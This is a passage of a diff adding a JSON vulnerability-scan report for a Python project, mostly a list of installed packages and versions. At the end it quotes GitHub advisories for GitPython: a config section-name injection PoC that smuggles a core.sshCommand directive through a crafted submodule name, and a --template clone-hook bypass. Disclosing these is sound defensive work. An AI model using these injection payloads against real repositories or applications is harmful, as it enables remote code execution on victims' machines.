+              "EndLine": 68
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pip_audit",
+          "Identifier": {
+            "PURL": "pkg:pypi/pip-audit@2.10.1",
+            "UID": "529724f4f88ea07"
+          },
+          "Version": "2.10.1",
+          "Locations": [
+            {
+              "StartLine": 69,
+              "EndLine": 69
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "platformdirs",
+          "Identifier": {
+            "PURL": "pkg:pypi/platformdirs@4.10.0",
+            "UID": "3103ce1c3564cc56"
+          },
+          "Version": "4.10.0",
+          "Locations": [
+            {
+              "StartLine": 70,
+              "EndLine": 70
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pluggy",
+          "Identifier": {
+            "PURL": "pkg:pypi/pluggy@1.6.0",
+            "UID": "538fc44966283dcb"
+          },
+          "Version": "1.6.0",
+          "Locations": [
+            {
+              "StartLine": 71,
+              "EndLine": 71
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "propcache",
+          "Identifier": {
+            "PURL": "pkg:pypi/propcache@0.5.2",
+            "UID": "5f03b77cd9ee6436"
+          },
+          "Version": "0.5.2",
+          "Locations": [
+            {
+              "StartLine": 72,
+              "EndLine": 72
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "psycopg",
+          "Identifier": {
+            "PURL": "pkg:pypi/psycopg@3.3.4",
+            "UID": "1a0a0e63beedb78"
+          },
+          "Version": "3.3.4",
+          "Locations": [
+            {
+              "StartLine": 73,
+              "EndLine": 73
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "psycopg-binary",
+          "Identifier": {
+            "PURL": "pkg:pypi/psycopg-binary@3.3.4",
+            "UID": "91547e1b22839c05"
+          },
+          "Version": "3.3.4",
+          "Locations": [
+            {
+              "StartLine": 74,
+              "EndLine": 74
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "py-serializable",
+          "Identifier": {
+            "PURL": "pkg:pypi/py-serializable@2.1.0",
+            "UID": "254693138077fad"
+          },
+          "Version": "2.1.0",
+          "Locations": [
+            {
+              "StartLine": 75,
+              "EndLine": 75
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pyOpenSSL",
+          "Identifier": {
+            "PURL": "pkg:pypi/pyopenssl@26.3.0",
+            "UID": "d887b142c7051adb"
+          },
+          "Version": "26.3.0",
+          "Locations": [
+            {
+              "StartLine": 84,
+              "EndLine": 84
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pyasn1",
+          "Identifier": {
+            "PURL": "pkg:pypi/pyasn1@0.6.4",
+            "UID": "5b49c56713ae9a96"
+          },
+          "Version": "0.6.4",
+          "Locations": [
+            {
+              "StartLine": 76,
+              "EndLine": 76
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pyasn1_modules",
+          "Identifier": {
+            "PURL": "pkg:pypi/pyasn1-modules@0.4.2",
+            "UID": "6c4bded21882198f"
+          },
+          "Version": "0.4.2",
+          "Locations": [
+            {
+              "StartLine": 77,
+              "EndLine": 77
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pycparser",
+          "Identifier": {
+            "PURL": "pkg:pypi/pycparser@3.0",
+            "UID": "3b940b28ee268b06"
+          },
+          "Version": "3.0",
+          "Locations": [
+            {
+              "StartLine": 78,
+              "EndLine": 78
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pycryptodome",
+          "Identifier": {
+            "PURL": "pkg:pypi/pycryptodome@3.23.0",
+            "UID": "1bd42b00a56717a"
+          },
+          "Version": "3.23.0",
+          "Locations": [
+            {
+              "StartLine": 79,
+              "EndLine": 79
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pydantic",
+          "Identifier": {
+            "PURL": "pkg:pypi/pydantic@2.13.4",
+            "UID": "cb9ca48d9860cbd4"
+          },
+          "Version": "2.13.4",
+          "Locations": [
+            {
+              "StartLine": 80,
+              "EndLine": 80
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pydantic_core",
+          "Identifier": {
+            "PURL": "pkg:pypi/pydantic-core@2.46.4",
+            "UID": "d8050db32eab1019"
+          },
+          "Version": "2.46.4",
+          "Locations": [
+            {
+              "StartLine": 81,
+              "EndLine": 81
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pyparsing",
+          "Identifier": {
+            "PURL": "pkg:pypi/pyparsing@3.3.2",
+            "UID": "29552e063b8dd4ee"
+          },
+          "Version": "3.3.2",
+          "Locations": [
+            {
+              "StartLine": 85,
+              "EndLine": 85
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pytest",
+          "Identifier": {
+            "PURL": "pkg:pypi/pytest@9.0.3",
+            "UID": "ac137022d1a4e44c"
+          },
+          "Version": "9.0.3",
+          "Locations": [
+            {
+              "StartLine": 86,
+              "EndLine": 86
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pytest-cov",
+          "Identifier": {
+            "PURL": "pkg:pypi/pytest-cov@7.1.0",
+            "UID": "96ad7359fb7b0088"
+          },
+          "Version": "7.1.0",
+          "Locations": [
+            {
+              "StartLine": 87,
+              "EndLine": 87
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pytest-django",
+          "Identifier": {
+            "PURL": "pkg:pypi/pytest-django@4.12.0",
+            "UID": "8c9187fba973d9d2"
+          },
+          "Version": "4.12.0",
+          "Locations": [
+            {
+              "StartLine": 88,
+              "EndLine": 88
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "python-dotenv",
+          "Identifier": {
+            "PURL": "pkg:pypi/python-dotenv@1.2.2",
+            "UID": "d1719419f6ba7ad8"
+          },
+          "Version": "1.2.2",
+          "Locations": [
+            {
+              "StartLine": 89,
+              "EndLine": 89
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pyunormalize",
+          "Identifier": {
+            "PURL": "pkg:pypi/pyunormalize@17.0.0",
+            "UID": "769c7bbbba4dd657"
+          },
+          "Version": "17.0.0",
+          "Locations": [
+            {
+              "StartLine": 90,
+              "EndLine": 90
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "redis",
+          "Identifier": {
+            "PURL": "pkg:pypi/redis@8.0.1",
+            "UID": "52976b7eb4c9fd61"
+          },
+          "Version": "8.0.1",
+          "Locations": [
+            {
+              "StartLine": 92,
+              "EndLine": 92
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "referencing",
+          "Identifier": {
+            "PURL": "pkg:pypi/referencing@0.37.0",
+            "UID": "c8db2b381686f2ed"
+          },
+          "Version": "0.37.0",
+          "Locations": [
+            {
+              "StartLine": 93,
+              "EndLine": 93
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "regex",
+          "Identifier": {
+            "PURL": "pkg:pypi/regex@2026.5.9",
+            "UID": "ad2c3869e4317a50"
+          },
+          "Version": "2026.5.9",
+          "Locations": [
+            {
+              "StartLine": 94,
+              "EndLine": 94
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "requests",
+          "Identifier": {
+            "PURL": "pkg:pypi/requests@2.34.2",
+            "UID": "489d32e8a1369e24"
+          },
+          "Version": "2.34.2",
+          "Locations": [
+            {
+              "StartLine": 95,
+              "EndLine": 95
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "rich",
+          "Identifier": {
+            "PURL": "pkg:pypi/rich@15.0.0",
+            "UID": "74ab34a4939ebe07"
+          },
+          "Version": "15.0.0",
+          "Locations": [
+            {
+              "StartLine": 96,
+              "EndLine": 96
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "rlp",
+          "Identifier": {
+            "PURL": "pkg:pypi/rlp@4.1.0",
+            "UID": "80776dacbc4ad02c"
+          },
+          "Version": "4.1.0",
+          "Locations": [
+            {
+              "StartLine": 97,
+              "EndLine": 97
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "rpds-py",
+          "Identifier": {
+            "PURL": "pkg:pypi/rpds-py@2026.5.1",
+            "UID": "c92b447d1ad1323d"
+          },
+          "Version": "2026.5.1",
+          "Locations": [
+            {
+              "StartLine": 98,
+              "EndLine": 98
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "ruff",
+          "Identifier": {
+            "PURL": "pkg:pypi/ruff@0.16.0",
+            "UID": "45078f8f3871acea"
+          },
+          "Version": "0.16.0",
+          "Locations": [
+            {
+              "StartLine": 99,
+              "EndLine": 99
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "scikit-learn",
+          "Identifier": {
+            "PURL": "pkg:pypi/scikit-learn@1.8.0",
+            "UID": "113cded15421ea8f"
+          },
+          "Version": "1.8.0",
+          "Locations": [
+            {
+              "StartLine": 100,
+              "EndLine": 100
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "scipy",
+          "Identifier": {
+            "PURL": "pkg:pypi/scipy@1.17.1",
+            "UID": "32f570621d987154"
+          },
+          "Version": "1.17.1",
+          "Locations": [
+            {
+              "StartLine": 101,
+              "EndLine": 101
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "setproctitle",
+          "Identifier": {
+            "PURL": "pkg:pypi/setproctitle@1.3.7",
+            "UID": "122f4c188f19a37"
+          },
+          "Version": "1.3.7",
+          "Locations": [
+            {
+              "StartLine": 102,
+              "EndLine": 102
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "shellingham",
+          "Identifier": {
+            "PURL": "pkg:pypi/shellingham@1.5.4",
+            "UID": "bf924d2fc38d1c6"
+          },
+          "Version": "1.5.4",
+          "Locations": [
+            {
+              "StartLine": 103,
+              "EndLine": 103
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "smmap",
+          "Identifier": {
+            "PURL": "pkg:pypi/smmap@5.0.3",
+            "UID": "4183e92409e49ed8"
+          },
+          "Version": "5.0.3",
+          "Locations": [
+            {
+              "StartLine": 104,
+              "EndLine": 104
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "sortedcontainers",
+          "Identifier": {
+            "PURL": "pkg:pypi/sortedcontainers@2.4.0",
+            "UID": "678ee5176674202"
+          },
+          "Version": "2.4.0",
+          "Locations": [
+            {
+              "StartLine": 105,
+              "EndLine": 105
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "sqlparse",
+          "Identifier": {
+            "PURL": "pkg:pypi/sqlparse@0.5.5",
+            "UID": "a76547838ca8df40"
+          },
+          "Version": "0.5.5",
+          "Locations": [
+            {
+              "StartLine": 106,
+              "EndLine": 106
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "starlette",
+          "Identifier": {
+            "PURL": "pkg:pypi/starlette@1.2.0",
+            "UID": "50bf7abfa4e5acd6"
+          },
+          "Version": "1.2.0",
+          "Locations": [
+            {
+              "StartLine": 107,
+              "EndLine": 107
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "tablib",
+          "Identifier": {
+            "PURL": "pkg:pypi/tablib@3.9.0",
+            "UID": "ac03f29bcb267184"
+          },
+          "Version": "3.9.0",
+          "Locations": [
+            {
+              "StartLine": 108,
+              "EndLine": 108
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "textual",
+          "Identifier": {
+            "PURL": "pkg:pypi/textual@8.2.7",
+            "UID": "3968ea034a44e7d7"
+          },
+          "Version": "8.2.7",
+          "Locations": [
+            {
+              "StartLine": 109,
+              "EndLine": 109
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "threadpoolctl",
+          "Identifier": {
+            "PURL": "pkg:pypi/threadpoolctl@3.6.0",
+            "UID": "9af94208d8805bc4"
+          },
+          "Version": "3.6.0",
+          "Locations": [
+            {
+              "StartLine": 110,
+              "EndLine": 110
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "tomli",
+          "Identifier": {
+            "PURL": "pkg:pypi/tomli@2.4.1",
+            "UID": "68d11a295c934c64"
+          },
+          "Version": "2.4.1",
+          "Locations": [
+            {
+              "StartLine": 111,
+              "EndLine": 111
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "tomli_w",
+          "Identifier": {
+            "PURL": "pkg:pypi/tomli-w@1.2.0",
+            "UID": "f85980a58ffbecea"
+          },
+          "Version": "1.2.0",
+          "Locations": [
+            {
+              "StartLine": 112,
+              "EndLine": 112
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "toolz",
+          "Identifier": {
+            "PURL": "pkg:pypi/toolz@1.1.0",
+            "UID": "d0dc7fb49cf9bab9"
+          },
+          "Version": "1.1.0",
+          "Locations": [
+            {
+              "StartLine": 113,
+              "EndLine": 113
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "typer",
+          "Identifier": {
+            "PURL": "pkg:pypi/typer@0.26.7",
+            "UID": "35267b3f31bc6a47"
+          },
+          "Version": "0.26.7",
+          "Locations": [
+            {
+              "StartLine": 114,
+              "EndLine": 114
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "types-requests",
+          "Identifier": {
+            "PURL": "pkg:pypi/types-requests@2.33.0.20260518",
+            "UID": "f64c4acc8ef55ca3"
+          },
+          "Version": "2.33.0.20260518",
+          "Locations": [
+            {
+              "StartLine": 115,
+              "EndLine": 115
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "typing-inspection",
+          "Identifier": {
+            "PURL": "pkg:pypi/typing-inspection@0.4.2",
+            "UID": "9e8ec4fd68cf8ed8"
+          },
+          "Version": "0.4.2",
+          "Locations": [
+            {
+              "StartLine": 116,
+              "EndLine": 116
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "typing_extensions",
+          "Identifier": {
+            "PURL": "pkg:pypi/typing-extensions@4.15.0",
+            "UID": "f83c4d901e52c935"
+          },
+          "Version": "4.15.0",
+          "Locations": [
+            {
+              "StartLine": 117,
+              "EndLine": 117
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "uc-micro-py",
+          "Identifier": {
+            "PURL": "pkg:pypi/uc-micro-py@2.0.0",
+            "UID": "ce95ed9c1327fc9c"
+          },
+          "Version": "2.0.0",
+          "Locations": [
+            {
+              "StartLine": 118,
+              "EndLine": 118
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "urllib3",
+          "Identifier": {
+            "PURL": "pkg:pypi/urllib3@2.7.0",
+            "UID": "be1ec10a2d6747a2"
+          },
+          "Version": "2.7.0",
+          "Locations": [
+            {
+              "StartLine": 119,
+              "EndLine": 119
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "uvicorn",
+          "Identifier": {
+            "PURL": "pkg:pypi/uvicorn@0.49.0",
+            "UID": "788a68e8533f4954"
+          },
+          "Version": "0.49.0",
+          "Locations": [
+            {
+              "StartLine": 120,
+              "EndLine": 120
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "uvloop",
+          "Identifier": {
+            "PURL": "pkg:pypi/uvloop@0.22.1",
+            "UID": "dbe1cae93f08d2cf"
+          },
+          "Version": "0.22.1",
+          "Locations": [
+            {
+              "StartLine": 121,
+              "EndLine": 121
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "watchfiles",
+          "Identifier": {
+            "PURL": "pkg:pypi/watchfiles@1.2.0",
+            "UID": "3041ecaeb16098b"
+          },
+          "Version": "1.2.0",
+          "Locations": [
+            {
+              "StartLine": 122,
+              "EndLine": 122
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "web3",
+          "Identifier": {
+            "PURL": "pkg:pypi/web3@7.16.0",
+            "UID": "16cc5ae59929812b"
+          },
+          "Version": "7.16.0",
+          "Locations": [
+            {
+              "StartLine": 123,
+              "EndLine": 123
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "webauthn",
+          "Identifier": {
+            "PURL": "pkg:pypi/webauthn@3.0.0",
+            "UID": "ba881bf0a5c57af3"
+          },
+          "Version": "3.0.0",
+          "Locations": [
+            {
+              "StartLine": 124,
+              "EndLine": 124
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "websockets",
+          "Identifier": {
+            "PURL": "pkg:pypi/websockets@15.0.1",
+            "UID": "160803a73188a295"
+          },
+          "Version": "15.0.1",
+          "Locations": [
+            {
+              "StartLine": 125,
+              "EndLine": 125
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "yarl",
+          "Identifier": {
+            "PURL": "pkg:pypi/yarl@1.24.2",
+            "UID": "83c7e9e523954f16"
+          },
+          "Version": "1.24.2",
+          "Locations": [
+            {
+              "StartLine": 126,
+              "EndLine": 126
+            }
+          ],
+          "AnalyzedBy": "pip"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "GHSA-3rp5-jjmw-4wv2",
+          "PkgName": "GitPython",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.52",
+            "UID": "b13af17e46d185d8"
+          },
+          "InstalledVersion": "3.1.52",
+          "FixedVersion": "3.1.53",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-3rp5-jjmw-4wv2",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:e2a5fee3c4a09f22ec8880d0f5d6eb2075f50596982a80cffe18201ad00929bb",
+          "Title": "GitPython: git-config section-name injection enables arbitrary config directives (core.sshCommand RCE)",
+          "Description": "### Summary\n\nIn GitPython `\u003c= 3.1.52`, the config writer neutralizes only CR, LF, and NUL in configuration **names**, but writes section names into the `[...]` header with no other escaping. A section/subsection name that contains `] [ \"` closes the intended header and opens a second same-line section, injecting an arbitrary config directive — with no newline required. Because a submodule **name** is attacker-controlled data (it comes from a repository's `.gitmodules`, or from an application that lets a user name a submodule) and is written verbatim into the parent repository's trusted `.git/config`, an attacker can set `core.sshCommand` (or `alias.*`, `core.pager`, `core.fsmonitor`) and achieve remote code execution on the victim's next git operation. Likely **CWE-74 (Injection)**.\n\nThis is a distinct variant of the injection addressed by GHSA-mv93-w799-cj2w / GHSA-v87r-6q3f-2j67: those fixed **newline** injection into config values/names (patched in 3.1.50); the `[r\\n\\x00]` guard added for them does not stop a **same-line** section break inside a name.\n\n### Details\n\nThe only guard applied to section/option names before writing is `_assure_config_name_safe`, which uses a regex that matches solely CR/LF/NUL:\n\n`git/config.py:75,897-899` (`GitPython 3.1.52`):\n\n```python\nUNSAFE_CONFIG_CHARS_RE = re.compile(r\"[\\r\\n\\x00]\")\n...\ndef _assure_config_name_safe(self, name: \"cp._SectionName\", label: str) -\u003e None:\n    if isinstance(name, str) and UNSAFE_CONFIG_CHARS_RE.search(name):\n        raise ValueError(\"Git config %s names must not contain CR, LF, or NUL\" % label)\n```\n\nThe name is then serialized into the header with no escaping of `]`, `[`, `\"`, space, `=` or `#`:\n\n`git/config.py:693`:\n\n```python\nfp.write((\"[%s]\\n\" % name).encode(defenc))\n```\n\nFor submodules the name is wrapped as `submodule \"\u003cname\u003e\"` (`git/objects/submodule/util.py:39`, `return f'submodule \"{name}\"'`), which supplies the balancing quote. A submodule named:\n\n```\nx\"] [core] sshCommand=CMD #\n```\n\ntherefore serializes to the header `[submodule \"x\"] [core] sshCommand=CMD #\"]`. git parses everything after the first `]` on that line as a fresh section, yielding `core.sshCommand=CMD` (the trailing `#\"]` is an inline comment). No CR/LF/NUL appears, so `_assure_config_name_safe` never fires.\n\nThe attacker-controlled name reaches this sink through documented public entry points that write it into the parent repository's `.git/config`:\n\n- `Repo.create_submodule(name=\u003cuntrusted\u003e, ...)` → `Submodule.add` → `git/objects/submodule/base.py:619` `writer.set_value(sm_section(name), \"url\", url)` — a single call, no hostile remote required.\n- `Repo.clone_from(\u003chostile url\u003e)` + `repo.submodule_update(init=True)` → `git/objects/submodule/base.py:855` `writer.set_value(sm_section(self.name), \"url\", self.url)`, where `self.name` is read unvalidated from the cloned repo's `.gitmodules`.\n\nAsymmetry: the sibling class is blocked — a newline in a config **value**, e.g. `set_value(\"core\", \"editor\", \"x\\n\\tsshCommand=CMD\")`, raises `ValueError`. The section-**name** bracket payload is not caught by the same guard.\n\n### PoC\n\nSingle self-contained script, run against the pinned release in an ephemeral environment. Non-destructive: the injected value is an inert marker, verified parse-only with `git config --get`; no ssh/fetch/push is run and nothing is executed.\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal PoC: git-config section-name injection in GitPython==3.1.52.\"\"\"\nfrom importlib.metadata import version\nimport os, tempfile, subprocess\nimport git\n\nprint(f\"# GitPython {version('GitPython')}\")        # version proof -- first line\n\nMARKER = \"MARKER_9f3a\"                               # inert; never executed\ntmp = tempfile.mkdtemp()\nenv = {**os.environ, \"HOME\": tmp,\n       \"GIT_CONFIG_GLOBAL\": os.path.join(tmp, \"gc\"), \"GIT_CONFIG_SYSTEM\": os.devnull,\n       \"GIT_AUTHOR_NAME\": \"a\", \"GIT_AUTHOR_EMAIL\": \"a@b.c\",\n       \"GIT_COMMITTER_NAME\": \"a\", \"GIT_COMMITTER_EMAIL\": \"a@b.c\"}\n\ndef run(*a, cwd=None):\n    return subprocess.run(a, cwd=cwd, env=env, capture_output=True, text=True)\n\n# A benign local repo used as the submodule url (a plain path, no network).\nsrc = os.path.join(tmp, \"src\"); os.makedirs(src)\nrun(\"git\", \"init\", \"-q\", src)\nopen(os.path.join(src, \"f\"), \"w\").write(\"x\")\nrun(\"git\", \"add\", \"f\", cwd=src); run(\"git\", \"commit\", \"-qm\", \"i\", cwd=src)\nsuburl = os.path.join(tmp, \"sub.git\"); run(\"git\", \"clone\", \"-q\", \"--bare\", src, suburl)\n\ndef parent_repo():\n    p = tempfile.mkdtemp(dir=tmp)\n    run(\"git\", \"init\", \"-q\", p)\n    open(os.path.join(p, \"r\"), \"w\").write(\"x\")\n    run(\"git\", \"add\", \"r\", cwd=p); run(\"git\", \"commit\", \"-qm\", \"i\", cwd=p)\n    return p\n\ndef injected_sshcommand(parent):\n    r = run(\"git\", \"config\", \"-f\", os.path.join(parent, \".git\", \"config\"),\n            \"--get\", \"core.sshCommand\")\n    return (r.returncode, r.stdout.strip())\n\nbenign = \"docs\"\nevil   = f'x\"] [core] sshCommand={MARKER} #'          # closes the header, opens [core]\n\np_control = parent_repo()\ngit.Repo(p_control).create_submodule(name=benign, path=\"docs\", url=suburl)\np_exploit = parent_repo()\ngit.Repo(p_exploit).create_submodule(name=evil, path=\"sub\", url=suburl)\n\nctl = injected_sshcommand(p_control)\nexp = injected_sshcommand(p_exploit)\nheader = [l for l in open(os.path.join(p_exploit, \".git\", \"config\")).read().splitlines()\n          if l.startswith(\"[submodule\")][0]\n\nprint(\"control name :\", repr(benign))\nprint(\"  git core.sshCommand -\u003e\", ctl, \"(unset)\")\nprint(\"exploit name :\", repr(evil))\nprint(\"  written header      -\u003e\", header)\nprint(\"  git core.sshCommand -\u003e\", exp)\n\nassert ctl[0] != 0 and ctl[1] == \"\", \"control unexpectedly set core.sshCommand\"\nassert exp == (0, MARKER), \"not reproduced\"\nprint(f\"VERDICT: attacker-controlled submodule name injected core.sshCommand={MARKER} \"\n      f\"into the victim's trusted .git/config (git would run it on the next ssh op)\")\n```\n\nRun:\n\n```bash\nuv run --with GitPython==3.1.52 python poc.py\n```\n\nObserved output:\n\n```\n# GitPython 3.1.52\ncontrol name : 'docs'\n  git core.sshCommand -\u003e (1, '') (unset)\nexploit name : 'x\"] [core] sshCommand=MARKER_9f3a #'\n  written header      -\u003e [submodule \"x\"] [core] sshCommand=MARKER_9f3a #\"]\n  git core.sshCommand -\u003e (0, 'MARKER_9f3a')\nVERDICT: attacker-controlled submodule name injected core.sshCommand=MARKER_9f3a into the victim's trusted .git/config (git would run it on the next ssh op)\n```\n\nThe benign name yields a single clean `[submodule \"docs\"]` section; the malicious name yields an injected `core.sshCommand`. Deterministic across runs. The payload must use balanced double-quotes (an unbalanced `\"` makes git reject the header); the `submodule \"\u003cname\u003e\"` wrapper balances them automatically.\n\n### Impact\n\nArbitrary attacker-controlled write into the victim's repository-local `.git/config`, which git fully trusts. `core.sshCommand` is executed as the ssh transport command on the victim's next ssh git operation (fetch/pull/push), giving remote code execution; other injectable keys (`alias.*`, `core.pager`, `core.fsmonitor`) fire on more common operations. Reachable in default configuration through two realistic paths:\n\n- an application that constructs a submodule from untrusted input via `Repo.create_submodule(name=...)` (single call); or\n- `Repo.clone_from` of an untrusted repository followed by `submodule_update` — the canonical submodule threat model, where the malicious name is read from the cloned `.gitmodules`.\n\nNo non-default git settings are required. Primarily a Unix vector: on Windows the `\"` in the resulting `.git/modules/\u003cname\u003e` directory name can abort the fresh-clone write branch (the direct config-API and `create_submodule` sinks are unaffected).\n\n### Recommended fix\n\nReject or escape configuration section/subsection/option **names** that contain `]`, `[`, `\"`, or leading/trailing whitespace (or apply git's own section-name escaping) in `_assure_config_name_safe` / `write_section`, rather than only CR/LF/NUL. Validating submodule names before they reach `sm_section` would additionally close the clone-driven path.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/1ed1b924f4e2d2ee7bab296df77b978af21853f1",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.53",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3rp5-jjmw-4wv2"
+          ],
+          "PublishedDate": "2026-07-24T16:22:02Z",
+          "LastModifiedDate": "2026-07-24T16:22:02Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-6p8h-3wgx-97gf",
+          "PkgName": "GitPython",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.52",
+            "UID": "b13af17e46d185d8"
+          },
+          "InstalledVersion": "3.1.52",
+          "FixedVersion": "3.1.54",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-6p8h-3wgx-97gf",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:385d780614055affc47f7cbd8d1e1b5d6122f7a4681b03b37ed3eb7074d7fddd",
+          "Title": "GitPython: Incomplete unsafe_git_clone_options denylist omits --template enabling arbitrary command execution via clone hooks",
+          "Description": "## Summary\nGitPython's `unsafe_git_clone_options` denylist omits `--template`. `git clone --template=\u003cdir\u003e` copies `\u003cdir\u003e/hooks/` into the new repository and runs them (`post-checkout` fires during clone), so a caller who can influence clone options can achieve arbitrary command execution in the default `allow_unsafe_options=False` configuration.\n\n## Root Cause\n`base.py:145-152` defines `unsafe_git_clone_options = [\"--upload-pack\",\"-u\",\"--config\",\"-c\"]` — `--template` is absent. The guard candidate `['--template']` passes `check_unsafe_options` (verified). git copies the hook directory and executes `post-checkout` at checkout time. git's `protocol.allow`/`GIT_ALLOW_PROTOCOL` do not gate `--template`; the incomplete denylist is the only defense.\n\n## Impact\nArbitrary OS command execution during clone (default config). Requires an attacker-readable directory containing an executable hook — a genuine second precondition (realistic via shared filesystems, upload dirs, `/tmp`, or attacker-writable network paths), reflected as AC:H.\n\n## Proof of Concept\n```python\n# attacker stages \u003cdir\u003e/hooks/post-checkout (chmod +x)\nfrom git import Repo\nRepo.clone_from(src, dst, template='\u003cdir\u003e')   # post-checkout hook executes -\u003e marker created (verified)\n```\n\n## Attack Chain\n1. Setup: attacker stages `\u003cdir\u003e/hooks/post-checkout` (chmod +x). Guard: n/a (filesystem).\n2. Entry: `Repo.clone_from(url, path, template='\u003cdir\u003e')`. Guard: `check_unsafe_options(candidates=['--template'], unsafe=unsafe_git_clone_options)`. Bypass proof: `--template` not on the denylist -\u003e passes (verified candidate `['--template']`, no error).\n3. Sink: git copies the hook and executes `post-checkout` at checkout. Impact: ACE, default config (verified marker created).\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): guard candidate `['--template']` passed with no error; staged `post-checkout` hook executed during `clone_from`, creating the marker. Independent of the value-smuggle bypass (`--template` is a legitimate long option that survives any single-char-value fix). Not covered by any existing advisory.\n\n## Affected Versions\n`\u003c= 3.1.53`\n\n## Suggested Fix\nAdd `--template` (and audit for other hook/exec-influencing options) to `unsafe_git_clone_options`.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 7.5
+            }
+          },
